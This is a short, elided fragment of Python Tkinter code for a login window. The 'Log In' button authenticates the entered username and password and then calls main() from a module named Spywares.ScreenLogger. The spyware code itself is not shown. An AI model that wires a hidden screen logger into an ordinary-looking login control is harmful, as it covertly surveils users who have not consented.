...
from Spywares.ScreenLogger import main
...
def create_canvas(window):
    ...
    login = custom_button.TkinterCustomButton(master=root, text="Log In", height=40, corner_radius=10,
                   command=lambda: [authenticate(s_image[0], password_entry.get(), user_entry.get()), main()]).place(relx=0.5, rely=0.7, anchor=CENTER)
